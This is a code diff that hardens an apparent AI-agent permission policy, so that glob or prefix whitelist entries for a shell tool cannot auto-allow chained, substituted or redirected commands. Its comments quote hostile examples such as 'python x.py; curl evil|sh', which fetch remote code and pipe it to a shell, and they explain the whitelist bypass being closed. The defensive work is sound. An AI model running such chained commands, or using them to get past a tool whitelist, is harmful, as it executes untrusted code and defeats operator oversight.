@@ -24,6 +24,36 @@ from .sanitization import (
 )
 
 
+# Shell operators that chain / substitute / redirect commands.  A whitelist
+# glob like ``python *`` must not be able to auto-allow these just because ``*``
+# swallowed them (``python x.py; curl evil|sh`` matches ``python *`` but runs
+# arbitrary commands under shell=True).  See :func:`_has_uncovered_shell_control`.
+#
+# The two-character operators ``&&`` / ``||`` are listed EXPLICITLY (before the
+# substring test would let them ride on a single ``&`` / ``|`` in the pattern):
+# an operator who authorizes a data-pipe with ``*|*`` must NOT thereby authorize
+# run-on-failure chaining (``foo || curl evil``), and ``&`` (backgrounding) must
+# not silently authorize ``&&`` (AND-chaining).  ``m not in pattern`` then
+# requires the operator to write the exact operator (``||`` / ``&&``) to allow it.
+_SHELL_CONTROL_METACHARS = (";", "||", "|", "&&", "&", "`", "$(", ">", "<", "\n", "\r")
+
+# Tools that execute their command through a shell (so glob-swallowed operators
+# are dangerous).  The cli tool is the documented shell surface.
+_SHELL_EXECUTING_TOOLS = frozenset({"cli_based_tool"})
+
+
+def _has_uncovered_shell_control(command: str, pattern: str) -> bool:
+    """True if ``command`` contains a shell-control metachar the whitelist
+    ``pattern`` did not literally authorize.
+
+    A bare-glob pattern (``python *``) has no metachars, so it can't
+    auto-allow command chaining / substitution / redirection.  An operator who
+    genuinely wants a pipe writes it into the pattern (``git log | *``), which
+    then authorizes ``|`` because it appears in the pattern.
+    """
+    return any(m in command and m not in pattern for m in _SHELL_CONTROL_METACHARS)
+
+
 class PermissionDecision(Enum):
     """Possible decisions from permission evaluation."""
     ALLOW = "allow"
@@ -280,7 +310,16 @@ class PermissionPolicy:
     def _matches_session_whitelist(self, tool_name: str, signature: str) -> bool:
         """Check if tool matches any session whitelist entry."""
         for pattern in self.session_whitelist:
-            if fnmatch.fnmatch(tool_name, pattern) or fnmatch.fnmatch(signature, pattern):
+            # A tool-name match is an explicit broad allow (e.g. "always allow
+            # cli") — honored as-is.
+            if fnmatch.fnmatch(tool_name, pattern):
+                return True
+            # A command-signature match on a shell tool must not let a bare
+            # glob swallow unauthorized shell operators (see _check_whitelist).
+            if fnmatch.fnmatch(signature, pattern):
+                if (tool_name in _SHELL_EXECUTING_TOOLS
+                        and _has_uncovered_shell_control(signature, pattern)):
+                    continue
                 return True
         return False
 
@@ -343,6 +382,13 @@ class PermissionPolicy:
         # Check pattern whitelist (glob-style matching)
         for pattern in self.whitelist_patterns:
             if fnmatch.fnmatch(signature, pattern):
+                # A shell tool's command whose glob-match swallowed shell
+                # operators the pattern didn't authorize is NOT whitelisted —
+                # fall through to ask/deny so ``python *`` can't green-light
+                # ``python x; curl evil|sh``.
+                if (tool_name in _SHELL_EXECUTING_TOOLS
+                        and _has_uncovered_shell_control(signature, pattern)):
+                    continue
                 return PolicyMatch(
                     decision=PermissionDecision.ALLOW,
                     reason=f"Command matches whitelist pattern: {pattern}",
@@ -358,6 +404,15 @@ class PermissionPolicy:
                 if isinstance(arg_value, str):
                     for allowed in allowed_values:
                         if arg_value.startswith(allowed):
+                            # A prefix-whitelisted command on a shell tool must
+                            # not smuggle shell operators past the allowed
+                            # prefix — ``command`` startswith ``python`` can't
+                            # green-light ``python x; curl evil|sh``.  The
+                            # operator writes the operator into the prefix to
+                            # authorize it (mirrors the glob path above).
+                            if (tool_name in _SHELL_EXECUTING_TOOLS
+                                    and _has_uncovered_shell_control(arg_value, allowed)):
+                                continue
                             return PolicyMatch(
                                 decision=PermissionDecision.ALLOW,
                                 reason=f"Argument '{arg_name}' matches allowed value: {allowed}",
